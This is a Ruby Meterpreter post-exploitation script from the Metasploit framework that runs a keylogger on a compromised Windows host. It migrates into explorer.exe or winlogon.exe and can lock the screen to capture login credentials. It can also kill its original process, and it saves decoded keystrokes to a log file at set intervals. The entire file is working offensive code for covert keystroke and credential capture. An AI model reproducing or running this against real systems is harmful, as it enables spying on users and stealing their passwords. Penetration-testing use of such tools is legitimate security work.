# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Updates by Shellster
#-------------------------------------------------------------------------------
session = client
# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false, "Help menu." ],
	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
	"-c"  => [ true,  "Type of key capture. (0) for user key presses, (1) for winlogon credential capture, or (2) for no migration.  Default is 2." ],
	"-l"  => [ false, "Lock screen when capturing Winlogon credentials."],
	"-k" => [ false, "Kill old Process"]
)
def usage
	print_line("Keylogger Recorder Meterpreter Script")
	print_line("This script will start the Meterpreter Keylogger and save all keys")
	print_line("in a log file for later anlysis. To stop capture hit Ctrl-C")
	print_line("Usage:" + @@exec_opts.usage)
	raise Rex::Script::Completed
end


#Get Hostname
host,port = session.session_host, session.session_port

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts', 'keylogrecorder')

# Create the log directory
::FileUtils.mkdir_p(logs)

#logfile name
logfile = logs + ::File::Separator + host + filenameinfo + ".txt"

#Interval for collecting Keystrokes in seconds
keytime = 30

#Type of capture
captype = 2
# Function for locking the screen -- Thanks for the idea and API call Mubix
def lock_screen
	print_status("Locking Screen...")
	lock_info = client.railgun.user32.LockWorkStation()
	if lock_info["GetLastError"] == 0
		print_status("Screen has been locked")
	else
		print_error("Screen lock Failed")
	end
end
#Function to Migrate in to Explorer process to be able to interact with desktop
def explrmigrate(session,captype,lock,kill)
	#begin
	if captype.to_i == 0
		process2mig = "explorer.exe"
	elsif captype.to_i == 1
		if is_uac_enabled?
			print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
			raise Rex::Script::Completed
		end
		process2mig = "winlogon.exe"
		if lock
			lock_screen
		end
	else
		process2mig = "explorer.exe"
	end
	# Actual migration
	mypid = session.sys.process.getpid
	session.sys.process.get_processes().each do |x|
		if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
			print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
			session.core.migrate(x['pid'].to_i)
			print_status("Migration Successful!!")
			
			if (kill)
				begin
					print_status("Killing old process")
					client.sys.process.kill(mypid)
					print_status("Old process killed.")
				rescue
					print_status("Failed to kill old process.")
				end
			end
		end
	end
	return true
	#	rescue
	#		print_status("Failed to migrate process!")
	#		return false
	#	end
end

#Function for starting the keylogger
def startkeylogger(session)
	begin
		#print_status("Grabbing Desktop Keyboard Input...")
		#session.ui.grab_desktop
		print_status("Starting the keystroke sniffer...")
		session.ui.keyscan_start
		return true
	rescue
		print_status("Failed to start Keylogging!")
		return false
	end
end

def write_keylog_data session, logfile
	data = session.ui.keyscan_dump
	outp = ""
	data.unpack("n*").each do |inp|
		fl = (inp & 0xff00) >> 8
		vk = (inp & 0xff)
		kc = VirtualKeyCodes[vk]

		f_shift = fl & (1<<1)
		f_ctrl  = fl & (1<<2)
		f_alt   = fl & (1<<3)

		if(kc)
			name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
			case name
			when /^.$/
				outp << name
			when /shift|click/i
			when 'Space'
				outp << " "
			else
				outp << " <#{name}> "
			end
		else
			outp << " <0x%.2x> " % vk
		end
	end

	sleep(2)

	if(outp.length > 0)
		file_local_write(logfile,"#{outp}\n")
	end
end

# Function for Collecting Capture
def keycap(session, keytime, logfile)
	begin
		rec = 1
		#Creating DB for captured keystrokes
		file_local_write(logfile,"")
		
		print_status("Keystrokes being saved in to #{logfile}")
		#Inserting keystrokes every number of seconds specified
		print_status("Recording ")
		while rec == 1
			#getting and writing Keystrokes
			write_keylog_data session, logfile

			sleep(keytime.to_i)
		end
	rescue::Exception => e
		print_status "Saving last few keystrokes"
		write_keylog_data session, logfile

		print("\n")
		print_status("#{e.class} #{e}")
		print_status("Stopping keystroke sniffer...")
		session.ui.keyscan_stop
	end
end

# Parsing of Options

helpcall = 0
lock = false
kill = false

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-t"
		keytime = val
	when "-c"
		captype = val
	when "-h"
		usage
	when "-l"
		lock = true
	when "-k"
		kill = true	
	end
}
if client.platform =~ /win32|win64/
	if (captype.to_i == 2)
		if startkeylogger(session)
			keycap(session, keytime, logfile)
		end
	elsif explrmigrate(session,captype,lock, kill)
		if startkeylogger(session)
			keycap(session, keytime, logfile)
		end
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
